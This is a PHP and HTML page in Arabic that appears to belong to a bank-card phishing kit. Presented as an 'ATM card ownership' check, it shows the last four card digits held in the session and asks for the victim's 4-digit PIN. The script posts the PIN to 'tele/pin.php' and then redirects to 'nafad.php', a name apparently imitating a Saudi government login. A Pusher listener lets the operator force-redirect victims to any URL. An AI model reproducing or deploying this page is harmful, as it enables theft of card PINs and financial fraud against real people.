<?php
session_start();

$clientId = $_SESSION['client_id'] ?? null;
$cardNumber = $_SESSION['card_number'] ?? '';

$digits = preg_replace('/\D/', '', $cardNumber);
$last4  = $digits ? substr($digits, -4) : '****';

if (!$clientId || !$cardNumber) {
    http_response_code(403);
    exit('NO_SESSION');
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>إثبات ملكية البطاقة - ATM</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Cairo','Tahoma',Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
    .container{max-width:740px;width:100%;background:#fff;box-shadow:0 4px 20px rgba(0,0,0,.08);border-radius:16px;overflow:hidden}
    .header{background:#fff;padding:24px 32px;border-bottom:1px solid #e5e7eb;display:flex;justify-content:space-between;align-items:center}
    .header-right{display:flex;align-items:center;gap:16px}
    .logo{height:70px;width:auto}
    @media (max-width: 768px) {.logo{transform: translateX(70px)}}
    .header-text{text-align:right}
    .content{padding:40px 32px;text-align:center}
    .atm-title{font-size:48px;font-weight:800;color:#1e40af;letter-spacing:8px;margin-bottom:16px}
    .main-instruction{font-size:18px;font-weight:700;color:#1f2937;margin-bottom:10px;line-height:1.6}
    .instruction-box{background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;padding:24px;margin:24px 0 32px;text-align:right}
    .instruction-text{font-size:15px;color:#374151;line-height:1.8}
    .instruction-highlight{color:#1e40af;font-weight:700}
    .pin-wrapper{display:flex;justify-content:center;gap:16px;margin:32px 0;direction:ltr}
    .pin-box{width:70px;height:80px;border:2px solid #d1d5db;border-radius:12px;background:#fff;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:700;color:#1f2937;transition:.2s all}
    .pin-box.filled{border-color:#10b981;background:#ecfdf5}
    .pin-box.active{border-color:#1e40af;box-shadow:0 0 0 3px rgba(30,64,175,.1)}
    .pin-input{width:100%;height:100%;border:none;background:transparent;text-align:center;font-size:32px;font-weight:700;color:#1f2937;outline:none;-webkit-text-security:disc}
    .numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:360px;margin:0 auto 32px}
    .numpad-key{height:64px;background:#fff;border:2px solid #e5e7eb;border-radius:12px;font-size:24px;font-weight:700;color:#1f2937;cursor:pointer;transition:.15s all;user-select:none}
    .numpad-key:hover{background:#f9fafb;border-color:#d1d5db}
    .numpad-key:active{transform:scale(.96);background:#f3f4f6}
    .numpad-key.action{background:#f3f4f6;font-size:20px}
    .submit-button{width:100%;height:64px;background:#d1d5db;color:#9ca3af;border:none;border-radius:16px;font-size:20px;font-weight:800;cursor:not-allowed;transition:.3s all;margin-top:24px}
    .submit-button.active{background:linear-gradient(135deg,#10b981 0%,#059669 100%);color:#fff;cursor:pointer;box-shadow:0 10px 30px rgba(16,185,129,.3)}
    .submit-button.active:hover{transform: translateY(-2px);box-shadow:0 12px 35px rgba(16,185,129,.4)}
    .error-message,.success-message{display:none;border-radius:12px;padding:12px 16px;margin-top:16px;font-size:14px;font-weight:600;text-align:center}
    .error-message{background:#fee2e2;border:1px solid #fecaca;color:#dc2626}
    .success-message{background:#ecfdf5;border:1px solid #bbf7d0;color:#15803d}
    @media(max-width:768px){.header{flex-direction:column;gap:16px;text-align:center}.content{padding:32px 20px}.atm-title{font-size:36px;letter-spacing:6px}.pin-box{width:60px;height:70px;font-size:28px}.numpad{max-width:100%}.numpad-key{height:56px;font-size:22px}}
  </style>
</head>
<body>

<div class="container">
  <div class="header">
    <div class="header-right">
      <img src="image/logot.png" class="logo">
      <div class="header-text"></div>
    </div>
  </div>

  <div class="content">
    <h2 class="atm-title">ATM</h2>
    <p class="main-instruction">إثبات ملكية البطاقة</p>
    <p class="main-instruction">لتأكيد العملية أدخل الرقم السري للصراف الآلي</p>

    <div class="instruction-box">
      <p class="instruction-text">
        الرجاء إدخال الرمز السري
        <span class="instruction-highlight">(PIN ATM)</span>
        المكوّن من
        <span class="instruction-highlight">4 أرقام</span>
        للبطاقة المنتهية بـ
        <span class="instruction-highlight"><?= htmlspecialchars($last4) ?></span>
      </p>
    </div>

    <div class="pin-wrapper">
      <div class="pin-box"><input class="pin-input" maxlength="1" readonly></div>
      <div class="pin-box"><input class="pin-input" maxlength="1" readonly></div>
      <div class="pin-box"><input class="pin-input" maxlength="1" readonly></div>
      <div class="pin-box"><input class="pin-input" maxlength="1" readonly></div>
    </div>

    <div class="numpad">
      <button type="button" class="numpad-key" data-value="3">3</button>
      <button type="button" class="numpad-key" data-value="2">2</button>
      <button type="button" class="numpad-key" data-value="1">1</button>
      <button type="button" class="numpad-key" data-value="6">6</button>
      <button type="button" class="numpad-key" data-value="5">5</button>
      <button type="button" class="numpad-key" data-value="4">4</button>
      <button type="button" class="numpad-key" data-value="9">9</button>
      <button type="button" class="numpad-key" data-value="8">8</button>
      <button type="button" class="numpad-key" data-value="7">7</button>
      <button type="button" class="numpad-key action" data-action="clear">مسح الكل</button>
      <button type="button" class="numpad-key" data-value="0">0</button>
      <button type="button" class="numpad-key action" data-action="back">⌫ مسح</button>
    </div>

    <button class="submit-button" id="submitBtn" type="button" disabled>تأكيد</button>

    <div class="error-message" id="errorMessage"></div>
    <div class="success-message" id="successMessage"></div>
  </div>
</div>

<script>
const inputs = document.querySelectorAll('.pin-input');
const boxes = document.querySelectorAll('.pin-box');
const keys = document.querySelectorAll('.numpad-key');
const submitBtn = document.getElementById('submitBtn');
const errorMessage = document.getElementById('errorMessage');
const successMessage = document.getElementById('successMessage');
let currentIndex = 0;

function updateUI() {
  boxes.forEach((box, idx) => {
    box.classList.remove('active','filled');
    if (idx === currentIndex) box.classList.add('active');
    if (inputs[idx].value) box.classList.add('filled');
  });
  const allFilled = [...inputs].every(i => i.value);
  submitBtn.disabled = !allFilled;
  submitBtn.classList.toggle('active', allFilled);
}

function handleNumberPress(v) {
  if (currentIndex < 4) {
    inputs[currentIndex].value = v;
    currentIndex++;
    updateUI();
  }
}

function handleBack() {
  if (currentIndex > 0) {
    currentIndex--;
    inputs[currentIndex].value = '';
    updateUI();
  }
}

function handleClear() {
  inputs.forEach(i => i.value = '');
  currentIndex = 0;
  updateUI();
}

function showError(msg) {
  errorMessage.textContent = msg;
  errorMessage.style.display = 'block';
  successMessage.style.display = 'none';
  setTimeout(() => { errorMessage.style.display = 'none'; }, 5000);
}

function showSuccess(msg) {
  successMessage.textContent = msg;
  successMessage.style.display = 'block';
  errorMessage.style.display = 'none';
}

keys.forEach(key => {
  key.addEventListener('click', () => {
    const v = key.dataset.value;
    const a = key.dataset.action;
    if (v) handleNumberPress(v);
    else if (a === 'back') handleBack();
    else if (a === 'clear') handleClear();
  });
});

// ✅ هذا هو الكود الصحيح - لا توجد form ولا submit!
submitBtn.addEventListener('click', async function() {
  const pin = [...inputs].map(i => i.value).join('');
  
  if (pin.length !== 4) {
    showError('الرجاء إدخال رمز PIN مكون من 4 أرقام');
    return;
  }

  submitBtn.disabled = true;
  submitBtn.textContent = 'جاري الإرسال...';

  const fd = new FormData();
  fd.append('client_id', '<?= $clientId ?>');
  fd.append('pin', pin);

  try {
    const res = await fetch('tele/pin.php', {
      method: 'POST',
      body: fd
    });

    const text = await res.text().then(t => t.trim());

    if (text === 'OK') {
      showSuccess('✓ تم الحفظ بنجاح! جاري التوجيه...');
      setTimeout(() => {
        window.location.href = "nafad.php";
      }, 300);
    } else {
      showError('❌ حدث خطأ: ' + text);
      submitBtn.disabled = false;
      submitBtn.textContent = 'تأكيد';
    }

  } catch (err) {
    console.error('Error:', err);
    showError('❌ حدث خطأ في الاتصال');
    submitBtn.disabled = false;
    submitBtn.textContent = 'تأكيد';
  }
});
</script>

<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
const pusher = new Pusher('a56388ee6222f6c5fb86', {
    cluster: 'ap2',
    encrypted: true
});

const channel = pusher.subscribe('my-channel');

channel.bind('force-redirect-user', function(data) {
    const myId = localStorage.getItem('current_user_id');
    if (myId && data.userId == myId) {
        window.location.href = data.url;
    }
});
</script>

</body>
</html>